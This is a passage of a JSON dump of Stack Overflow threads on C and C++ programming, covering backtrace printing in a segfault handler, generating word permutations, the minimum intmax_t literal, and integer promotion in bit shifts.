'X'\n</code></pre>\n\n<p>Is it related to the <code>strcat()</code> and <code>strcpy()</code> functions?</p>\n"}, {"tags": ["c++", "c", "backtrace"], "comments": [{"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "edited": false, "score": 1, "creation_date": 1518566132, "post_id": 48777553, "comment_id": 84556803, "body": "Did you compile with debugging symbols enabled (<code>-g</code>)?"}, {"owner": {"reputation": 12040, "user_id": 510036, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/b7c510641e6526d19abc93e866e75ac8?s=128&d=identicon&r=PG", "display_name": "Qix - MONICA WAS MISTREATED", "link": "https://stackoverflow.com/users/510036/qix-monica-was-mistreated"}, "edited": false, "score": 0, "creation_date": 1518566567, "post_id": 48777553, "comment_id": 84556923, "body": "I always use <code>-g3</code>, personally - depending on the compiler."}, {"owner": {"reputation": 52656, "user_id": 225074, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/dea26ac1ef8259140d28aa8b5ba4f1b3?s=128&d=identicon&r=PG", "display_name": "Thomas Matthews", "link": "https://stackoverflow.com/users/225074/thomas-matthews"}, "edited": false, "score": 0, "creation_date": 1518571046, "post_id": 48777553, "comment_id": 84558121, "body": "Since you tagged this a C++ and are programming in C++, get rid of the <code>typedef</code> before a struct, as it is not needed in C++.  You also don&#39;t need the <code>struct</code> keyword when declaring a variable."}, {"owner": {"reputation": 52656, "user_id": 225074, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/dea26ac1ef8259140d28aa8b5ba4f1b3?s=128&d=identicon&r=PG", "display_name": "Thomas Matthews", "link": "https://stackoverflow.com/users/225074/thomas-matthews"}, "edited": false, "score": 0, "creation_date": 1518571132, "post_id": 48777553, "comment_id": 84558149, "body": "You should also use <code>std::string</code> instead of <code>char *</code>.  With pointers, you have to deal with ownership and maybe deep copy as well as always allocating space for the character array.  You can pass a <code>std::string</code> by reference so no copies are made and you don&#39;t need to worry about ownership or misplaced pointers."}, {"owner": {"reputation": 56858, "user_id": 131930, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/91536fe27d32713b8a154a0bf42f6748?s=128&d=identicon&r=PG", "display_name": "Jeremy Friesner", "link": "https://stackoverflow.com/users/131930/jeremy-friesner"}, "edited": false, "score": 0, "creation_date": 1518584740, "post_id": 48777553, "comment_id": 84561590, "body": "You might try adding the flag -rdynamic to your compiler and linker arguments; I find that helps generate more useful stack traces."}, {"owner": {"reputation": 57, "user_id": 7525409, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13a35176e857e85554e820b5013d25ac?s=128&d=identicon&r=PG", "display_name": "Alex Lepailleur", "link": "https://stackoverflow.com/users/7525409/alex-lepailleur"}, "reply_to_user": {"reputation": 52656, "user_id": 225074, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/dea26ac1ef8259140d28aa8b5ba4f1b3?s=128&d=identicon&r=PG", "display_name": "Thomas Matthews", "link": "https://stackoverflow.com/users/225074/thomas-matthews"}, "edited": false, "score": 0, "creation_date": 1518591804, "post_id": 48777553, "comment_id": 84564124, "body": "@Thomas Matthews: if I don&#39;t put struct then it interprets it as the function sigaction. For the typedef I agree, I just copied something from another answer but don&#39;t think it&#39;s what&#39;s causing the &quot;issue&quot; here? Finally I am using the char* just to illustrate the question, which is about where addr2line points when printing the stack trace"}, {"owner": {"reputation": 57, "user_id": 7525409, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13a35176e857e85554e820b5013d25ac?s=128&d=identicon&r=PG", "display_name": "Alex Lepailleur", "link": "https://stackoverflow.com/users/7525409/alex-lepailleur"}, "reply_to_user": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "edited": false, "score": 0, "creation_date": 1518591810, "post_id": 48777553, "comment_id": 84564127, "body": "@nemequ: I did compile with -g"}, {"owner": {"reputation": 57, "user_id": 7525409, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13a35176e857e85554e820b5013d25ac?s=128&d=identicon&r=PG", "display_name": "Alex Lepailleur", "link": "https://stackoverflow.com/users/7525409/alex-lepailleur"}, "reply_to_user": {"reputation": 56858, "user_id": 131930, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/91536fe27d32713b8a154a0bf42f6748?s=128&d=identicon&r=PG", "display_name": "Jeremy Friesner", "link": "https://stackoverflow.com/users/131930/jeremy-friesner"}, "edited": false, "score": 0, "creation_date": 1518591813, "post_id": 48777553, "comment_id": 84564129, "body": "@Jeremy Friesner: I&#39;ll try the -rdynamic"}], "owner": {"reputation": 57, "user_id": 7525409, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13a35176e857e85554e820b5013d25ac?s=128&d=identicon&r=PG", "display_name": "Alex Lepailleur", "link": "https://stackoverflow.com/users/7525409/alex-lepailleur"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 228, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518565825, "creation_date": 1518565825, "question_id": 48777553, "link": "https://stackoverflow.com/questions/48777553/stacktrace-file-and-line-position", "title": "Stacktrace file and line position", "body": "<p>so there are quite some question about this already and thank to threads like <a href=\"https://stackoverflow.com/questions/15129089/is-there-a-way-to-dump-stack-trace-with-line-number-from-a-linux-release-binary\">this one</a> I have the file and line number kind of working.</p>\n\n<p>The issue is that I am not getting what I was expecting in some case and try to figure out why and if there is a way to work around it.</p>\n\n<p>Example</p>\n\n<pre><code>typedef struct _sig_ucontext {\n    unsigned long uc_flags;\n    struct ucontext *uc_link;\n    stack_t uc_stack;\n    struct sigcontext uc_mcontext;\n    sigset_t uc_sigmask;\n} sig_ucontext_t;\n\nvoid crit_err_hdlr(int sig_num, siginfo_t * info, void * ucontext)\n{\n    void * array[50];\n    void * caller_address;\n    char ** messages;\n    int size, i;\n    sig_ucontext_t * uc;\n\n    uc = (sig_ucontext_t *) ucontext;\n\n    /* Get the address at the time the signal was raised */\n#if defined(__i386__) // gcc specific\n    caller_address = (void *) uc-&gt;uc_mcontext.eip; // EIP: x86 specific\n#elif defined(__x86_64__) // gcc specific\n    caller_address = (void *) uc-&gt;uc_mcontext.rip; // RIP: x86_64 specific\n#endif\n\n    fprintf(stderr, \"signal %d (%s), address is %p from %p\\n\", sig_num, strsignal(sig_num), info-&gt;si_addr, (void *) caller_address);\n\n    size = backtrace(array, 50);\n\n    /* overwrite sigaction with caller's address */\n    array[1] = caller_address;\n\n    messages = backtrace_symbols(array, size);\n\n    /* skip first stack frame (points here) */\n    for (i = 1; i &lt; size &amp;&amp; messages != NULL; ++i)\n    {\n        fprintf(stderr, \"[bt]: (%d) %s\\n\", i, messages[i]);\n\n        char syscom[256];\n        sprintf(syscom, \"addr2line %p -e GEBMerge\", array[i]);\n        system(syscom);\n    }\n\n    free(messages);\n\n    exit(EXIT_FAILURE);\n}\n</code></pre>\n\n<p>I prepare the signal handler then I have the <em>main</em> function.</p>\n\n<pre><code>int main(int argc, char **argv)\n{\n    //     std::cerr &lt;&lt; \"Entering main function of GEBMerge.cxx...\\n\";\n\n    struct sigaction sigact;\n\n    sigact.sa_sigaction = crit_err_hdlr;\n    sigact.sa_flags = SA_RESTART | SA_SIGINFO;\n\n    if (sigaction(SIGSEGV, &amp;sigact, (struct sigaction *) NULL) != 0)\n    {\n        fprintf(stderr, \"error setting signal handler for %d (%s)\\n\",\n        SIGSEGV, strsignal(SIGSEGV));\n\n        exit(EXIT_FAILURE);\n    }\n\n    int* crash = 0;\n    *crash = 666;\n\n    return 0;\n}\n</code></pre>\n\n<p>This will produce</p>\n\n<pre><code>signal 11 (Segmentation fault), address is (nil) from 0x402423\n[bt]: (1) ./GEBMerge(main+0x43) [0x402423]\n/mnt/hgfs/Dropbox/ORNL/software/goddess_daq/source/GEBMerge.cxx:245\n[bt]: (2) ./GEBMerge(main+0x43) [0x402423]\n/mnt/hgfs/Dropbox/ORNL/software/goddess_daq/source/GEBMerge.cxx:245\n[bt]: (3) /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fd58e7c1830]\n??:0\n[bt]: (4) ./GEBMerge(_start+0x29) [0x402519]\n??:?\n</code></pre>\n\n<p>Which seems fine (even though I am not sure why the first line appears twice).</p>\n\n<p>But then if I use this in the <em>main</em> instead</p>\n\n<pre><code>int main(int argc, char **argv)\n{\n    //     std::cerr &lt;&lt; \"Entering main function of GEBMerge.cxx...\\n\";\n\n    struct sigaction sigact;\n\n    sigact.sa_sigaction = crit_err_hdlr;\n    sigact.sa_flags = SA_RESTART | SA_SIGINFO;\n\n    if (sigaction(SIGSEGV, &amp;sigact, (struct sigaction *) NULL) != 0)\n    {\n        fprintf(stderr, \"error setting signal handler for %d (%s)\\n\",\n        SIGSEGV, strsignal(SIGSEGV));\n\n        exit(EXIT_FAILURE);\n    }\n\n    char* crash = 0;\n    sprintf(crash, \"crash it damit!\");\n\n    return 0;\n}\n</code></pre>\n\n<p>I get the following</p>\n\n<pre><code>signal 11 (Segmentation fault), address is (nil) from 0x403503\n[bt]: (1) ./GEBMerge(main+0x73) [0x403503]\n/usr/include/x86_64-linux-gnu/bits/stdio2.h:34\n[bt]: (2) ./GEBMerge(main+0x73) [0x403503]\n/usr/include/x86_64-linux-gnu/bits/stdio2.h:34\n[bt]: (3) /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0) \n[0x7f5f74ba9830]\n??:0\n[bt]: (4) ./GEBMerge(_start+0x29) [0x406169]\n??:?\n</code></pre>\n\n<p>I understand why the line <code>/usr/include/x86_64-linux-gnu/bits/stdio2.h:34</code> appears (linked to the sprintf function I assume) but I was expecting to see, somewhere in this stacktrace, a reference to the line calling <em>sprintf</em> in the <em>main</em> of my program.</p>\n\n<p>I guess there is something I am missing but cannot figure out what.</p>\n\n<p>Thanks for any help</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 1636, "user_id": 3370124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f73352b4adb282c092738f34883488dd?s=128&d=identicon&r=PG&f=1", "display_name": "Richard Critten", "link": "https://stackoverflow.com/users/3370124/richard-critten"}, "edited": false, "score": 2, "creation_date": 1518559105, "post_id": 48776323, "comment_id": 84554499, "body": "Have a read of <code>std::next_permutation</code> <a href=\"http://en.cppreference.com/w/cpp/algorithm/next_permutation\" rel=\"nofollow noreferrer\">en.cppreference.com/w/cpp/algorithm/next_permutation</a>"}, {"owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "edited": false, "score": 2, "creation_date": 1518559134, "post_id": 48776323, "comment_id": 84554512, "body": "The <a href=\"https://stackoverflow.com/questions/tagged/c%2b%2b\">c++</a> tag appears to have no place in this question."}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 3, "creation_date": 1518559140, "post_id": 48776323, "comment_id": 84554517, "body": "Are you asking for a c or a c++ solution? They will likely be very different."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518559686, "post_id": 48776323, "comment_id": 84554700, "body": "Do you want to permute words or characters? Right now you are not considering the words."}, {"owner": {"reputation": 2783, "user_id": 782570, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cbbf87d7ce9ed596faa7e64231114991?s=128&d=identicon&r=PG&f=1", "display_name": "giusti", "link": "https://stackoverflow.com/users/782570/giusti"}, "edited": false, "score": 0, "creation_date": 1518559712, "post_id": 48776323, "comment_id": 84554714, "body": "This program seems correct, but it makes permutation of the characters. If you want to make permutations of words, you just have to modify it to work on an array of words."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1518560415, "post_id": 48776323, "comment_id": 84554976, "body": "Seems like the example has some typos, e.g. <code>two three two</code> doesn&#39;t seem right."}, {"owner": {"reputation": 9, "user_id": 9357212, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Phyllis Dillion", "link": "https://stackoverflow.com/users/9357212/phyllis-dillion"}, "edited": false, "score": 0, "creation_date": 1518560612, "post_id": 48776323, "comment_id": 84555043, "body": "Corrected. Yes, I was hoping for a C solution, not C++. It works with letters, but I do not know how to make it work words only."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518560966, "post_id": 48776323, "comment_id": 84555175, "body": "Since the string has three words, I would create a string with three letters, e.g. <code>&quot;abc&quot;</code>. Then permute the letters. When it comes time to print, substitute the words for the letters. For example, print &quot;one&quot; instead of &quot;a&quot;, etc."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518563959, "post_id": 48776323, "comment_id": 84556163, "body": "@user3386109 : you have made a simple problem over-complicated.  Split the string at the space-delimiters (using strtok() for example) and simply generate permutations of the <i>pointers</i> to each word."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1518564207, "post_id": 48776323, "comment_id": 84556244, "body": "<i>Yes, I was hoping for a C solution</i>: hmm, so why did you use the C++ tag in first place?"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "reply_to_user": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1518564516, "post_id": 48776323, "comment_id": 84556332, "body": "@Clifford Your solution runs into problems when starting with a string that contains duplicates, like <code>&quot;one two one three&quot;</code>."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518564922, "post_id": 48776323, "comment_id": 84556449, "body": "@user3386109 : They are distinct strings - the OP is not clear about what is required.  If that is the requirement then he first has to generate the <i>set of unique words</i>.  I am not sure how your suggestion solves the problem of duplication either - the association of letter to locations in the string is hard to implement or strings of an arbitrary number of words."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1518565090, "post_id": 48776323, "comment_id": 84556498, "body": "Dumping <a href=\"https://www.geeksforgeeks.org/write-a-c-program-to-print-all-permutations-of-a-given-string/\" rel=\"nofollow noreferrer\">somone else&#39;s code</a> verbatim and without attribution then asking how to adapt it to solve a different (and ambiguously defined) problem does not make for a good question."}], "answers": [{"tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": false, "score": 1, "last_activity_date": 1518561251, "creation_date": 1518561251, "answer_id": 48776803, "question_id": 48776323, "link": "https://stackoverflow.com/questions/48776323/word-permutation-generator/48776803#48776803", "title": "Word Permutation Generator", "body": "<p>Instead of</p>\n\n<pre><code>char str[] = \"one two three\";\n</code></pre>\n\n<p>try starting with</p>\n\n<pre><code>char *strs[3];\nstrs[0] = \"one\";\nstrs[1] = \"two\";\nstrs[2] = \"three\";\n</code></pre>\n\n<p>And then modify your existing algorithm to work with that.</p>\n"}], "owner": {"reputation": 9, "user_id": 9357212, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Phyllis Dillion", "link": "https://stackoverflow.com/users/9357212/phyllis-dillion"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 212, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1518565493, "creation_date": 1518558996, "last_edit_date": 1518565493, "question_id": 48776323, "link": "https://stackoverflow.com/questions/48776323/word-permutation-generator", "title": "Word Permutation Generator", "body": "<p>I found several examples of what I was looking to do, but none worked quite exactly how I wanted, of course.</p>\n\n<p>I'm trying to modify the following program to display all possible combinations of a string of words. So, for example:</p>\n\n<pre><code>*str = \"one two\"; // would be:\none two\ntwo one\n\n*str = \"one two three\"; // would be:\none two three\none three two\n\ntwo one three\ntwo three one\n\nthree one two\nthree two one\n</code></pre>\n\n<p>etc..</p>\n\n<p>Here is what I am working with, which produces duplicates as well, which I do not want.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n/* Function to swap values at two pointers */\nvoid swap(char *x, char *y)\n{\n    char temp;\n    temp = *x;\n    *x = *y;\n    *y = temp;\n}\n\n/* Function to print permutations of string\n   This function takes three parameters:\n   1. String\n   2. Starting index of the string\n   3. Ending index of the string. */\nvoid permute(char *a, int l, int r)\n{\n   int i;\n   if (l == r)\n     printf(\"%s\\n\", a);\n   else\n   {\n       for (i = l; i &lt;= r; i++)\n       {\n          swap((a+l), (a+i));\n          permute(a, l+1, r);\n          swap((a+l), (a+i)); //backtrack\n       }\n   }\n}\n\n/* Driver program to test above functions */    \nint main()\n{\n    char str[] = \"one two three\";\n    int n = strlen(str);\n    permute(str, 0, n-1);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 1, "creation_date": 1518556928, "post_id": 48775790, "comment_id": 84553379, "body": "Can you show us some code that causes these warnings?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518557420, "post_id": 48775790, "comment_id": 84553627, "body": "<code>intmax_t min = -9223372036854775808;</code> is not valid as <code>9223372036854775808</code> is outside the <code>intmax_t</code> range.  <code>intmax_t min = -9223372036854775807 - 1;</code> is valid."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user9085691"}, "edited": false, "score": 0, "creation_date": 1518558260, "post_id": 48775883, "comment_id": 84554038, "body": "I&#39;m not sure if this warrants an extra thread, but how would I change the MAX_INT or MIN_INT of an external header file? Is there any way I can make the min value valid for &lt;stdint.h&gt;? Well, I guess it&#39;s just giving me extra work since I&#39;ll have to deal with the minimum once I apply that, but I think it&#39;ll be useful to know."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1518558785, "post_id": 48775883, "comment_id": 84554345, "body": "The short answer is you cannot increase <code>INT_MAX</code> (or decrease <code>INT_MIN</code>) from values other than those specified in <code>limits.h</code>. Why? Because they are already set to the max/min that is possible for the number of bits per type. Anything larger than <code>INT_MAX</code> would require 33-bits instead of 32-bits."}], "tags": [], "owner": {"reputation": 58292, "user_id": 34824, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ri8DI.jpg?s=128&g=1", "display_name": "abelenky", "link": "https://stackoverflow.com/users/34824/abelenky"}, "is_accepted": true, "score": 6, "last_activity_date": 1518557055, "creation_date": 1518557055, "answer_id": 48775883, "question_id": 48775790, "link": "https://stackoverflow.com/questions/48775790/are-intmax-t-max-and-min-values-unique/48775883#48775883", "title": "Are intmax_t max and min values unique?", "body": "<p><em>(allow me to use 16-bit values for shorter numbers)</em></p>\n\n<p>Technically, when you write <code>-32768</code> in C, you have written:\n<em>\"Negative of the value 32768\"</em></p>\n\n<p>And 32,768 is too big for a positive 16-bit value, even though -32,768 is valid.</p>\n\n<p>This is why you'll often see in header files like <code>limits.h</code>:</p>\n\n<pre><code>#define MAX_INT 32767\n#define MIN_INT (-MAX_INT - 1)\n/* Translates to -32767 - 1 ==&gt; -32768 */\n</code></pre>\n\n<hr>\n\n<p>This question covers essentially the same information:</p>\n\n<p><a href=\"https://stackoverflow.com/questions/11270084/why-are-there-differing-definitions-of-int64-min-and-why-do-they-behave-differe\">Why are there differing definitions of INT64_MIN? And why do they behave differently?</a></p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user9085691"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 189, "favorite_count": 0, "accepted_answer_id": 48775883, "answer_count": 1, "score": 3, "last_activity_date": 1518558050, "creation_date": 1518556673, "last_edit_date": 1518558050, "question_id": 48775790, "link": "https://stackoverflow.com/questions/48775790/are-intmax-t-max-and-min-values-unique", "title": "Are intmax_t max and min values unique?", "body": "<p>For most integer types, the minimum will be 1 \"larger\" than the max, right?</p>\n\n<p>Like the range for long long is -9223372036854775808 to 9223372036854775807. When I'm running my program, why is it that both -9223372036854775808 and 9223372036854775808 give me a compiler warning and cause errors, as opposed to only the intmax_t max? </p>\n\n<p>Because the intmax_t min should be valid at -9223372036854775808, no?</p>\n\n<p>Edit: I also tried 9223372036854775807 and -9223372036854775807, they both work fine.  </p>\n"}, {"tags": ["c++", "c", "compilation", "compiler-optimization", "clang++"], "comments": [{"owner": {"reputation": 436126, "user_id": 922184, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h7WDB.jpg?s=128&g=1", "display_name": "Mysticial", "link": "https://stackoverflow.com/users/922184/mysticial"}, "edited": false, "score": 5, "creation_date": 1518556464, "post_id": 48775746, "comment_id": 84553179, "body": "Integer promotion."}, {"owner": {"reputation": 280, "user_id": 2956948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9902d14caad47599731eac745a847cfc?s=128&d=identicon&r=PG&f=1", "display_name": "polynomial_donut", "link": "https://stackoverflow.com/users/2956948/polynomial-donut"}, "reply_to_user": {"reputation": 436126, "user_id": 922184, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h7WDB.jpg?s=128&g=1", "display_name": "Mysticial", "link": "https://stackoverflow.com/users/922184/mysticial"}, "edited": false, "score": 0, "creation_date": 1518556672, "post_id": 48775746, "comment_id": 84553254, "body": "Ah lol. Thanks @Mysticial ! Do you care to answer? Otherwise I&#39;ll just answer it myself quickly. I guess the takeaway for me is to rather use <code>&amp;</code> instead of left and right shifting..."}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1518556678, "post_id": 48775746, "comment_id": 84553256, "body": "Also, generally shift left followed by shift right by the same amount of bits, is not the identity operation as you seem to expect. It performs a mask operation."}, {"owner": {"reputation": 47569, "user_id": 3255455, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5993e7ece129141878cd6419d39cc26e?s=128&d=identicon&r=PG&f=1", "display_name": "gnasher729", "link": "https://stackoverflow.com/users/3255455/gnasher729"}, "edited": false, "score": 0, "creation_date": 1518556681, "post_id": 48775746, "comment_id": 84553258, "body": "If var isn&#39;t initialised then the result is undefined behaviour, which means (among other things) that it is legal if var2 == var, with no shifts produced."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1518556693, "post_id": 48775746, "comment_id": 84553266, "body": "I wouldn&#39;t say a co&#239;ncidence. If the values are &quot;within range&quot; (I mean: no 1 bits are shifted off left), then the values are identical."}, {"owner": {"reputation": 1636, "user_id": 3370124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f73352b4adb282c092738f34883488dd?s=128&d=identicon&r=PG&f=1", "display_name": "Richard Critten", "link": "https://stackoverflow.com/users/3370124/richard-critten"}, "reply_to_user": {"reputation": 436126, "user_id": 922184, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h7WDB.jpg?s=128&g=1", "display_name": "Mysticial", "link": "https://stackoverflow.com/users/922184/mysticial"}, "edited": false, "score": 0, "creation_date": 1518556854, "post_id": 48775746, "comment_id": 84553345, "body": "fyi: as @Mysticial says plus with: g++ 5.1.0: warning: conversion to &#39;uint8_t {aka unsigned char}&#39; from &#39;int&#39; may alter its value [-Wconversion]"}, {"owner": {"reputation": 280, "user_id": 2956948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9902d14caad47599731eac745a847cfc?s=128&d=identicon&r=PG&f=1", "display_name": "polynomial_donut", "link": "https://stackoverflow.com/users/2956948/polynomial-donut"}, "reply_to_user": {"reputation": 1636, "user_id": 3370124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f73352b4adb282c092738f34883488dd?s=128&d=identicon&r=PG&f=1", "display_name": "Richard Critten", "link": "https://stackoverflow.com/users/3370124/richard-critten"}, "edited": false, "score": 0, "creation_date": 1518557199, "post_id": 48775746, "comment_id": 84553513, "body": "@RichardCritten is there a <code>clang</code> flag to enable such warnings? I didn&#39;t get any..."}, {"owner": {"reputation": 1636, "user_id": 3370124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f73352b4adb282c092738f34883488dd?s=128&d=identicon&r=PG&f=1", "display_name": "Richard Critten", "link": "https://stackoverflow.com/users/3370124/richard-critten"}, "edited": false, "score": 1, "creation_date": 1518557544, "post_id": 48775746, "comment_id": 84553686, "body": "@polynomial_donut same flag: clang 5.0.0 ( tested on <a href=\"https://godbolt.org/g/kXVkQz\" rel=\"nofollow noreferrer\">godbolt.org/g/kXVkQz</a> ) &lt;source&gt;:6:17: warning: implicit conversion loses integer precision: &#39;int&#39; to &#39;uint8_t&#39; (aka &#39;unsigned char&#39;) [-Wconversion]"}], "answers": [{"comments": [{"owner": {"reputation": 280, "user_id": 2956948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9902d14caad47599731eac745a847cfc?s=128&d=identicon&r=PG&f=1", "display_name": "polynomial_donut", "link": "https://stackoverflow.com/users/2956948/polynomial-donut"}, "edited": false, "score": 0, "creation_date": 1518556763, "post_id": 48775794, "comment_id": 84553303, "body": "Am I wrong by saying <code>var</code> is promoted to <code>size_t</code> aka <code>unsigned int</code> (not <code>int</code>)?"}, {"owner": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 0, 